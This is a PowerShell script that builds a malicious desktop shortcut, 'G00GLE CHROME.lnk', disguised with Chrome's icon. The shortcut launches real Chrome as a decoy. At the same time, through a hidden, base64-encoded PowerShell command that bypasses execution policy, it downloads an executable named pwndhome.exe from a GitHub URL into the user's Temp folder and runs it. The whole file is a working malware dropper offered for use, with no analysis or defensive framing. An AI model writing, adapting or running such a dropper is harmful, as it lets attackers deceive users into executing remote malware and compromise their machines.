#set variables
$payloadURL="`"https://github.com/skatecoder/easymoney/blob/main/pwndhome.exe?raw=true`""
$payloadPath="`"`$home\AppData\Local\Temp\pwndhome.exe`""
$ShortcutFileName= "G00GLE CHROME.lnk"
$DecoyLegitApp= "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"

#encoded payload (don't edit)
$Payload = "start-process `"$DecoyLegitApp`"; (New-Object System.Net.WebClient).DownloadFile($payloadURL,$payloadPath); & $payloadPath"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$EncodedPayload =[Convert]::ToBase64String($Bytes)


#lnk file properties (don't edit)
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\$ShortcutFileName")
$ShortCut.WindowStyle = 7
$ShortCut.TargetPath = "powershell.exe"
$ShortCut.Arguments = "powershell.exe -ExecutionPolicy Bypass -noLogo -encodedcommand $EncodedPayload"
$ShortCut.IconLocation = "$DecoyLegitApp, 0";
$Shortcut.WorkingDirectory = "$(split-path $DecoyLegitApp)\"
$ShortCut.Description = "Type: Application";
$ShortCut.Save()
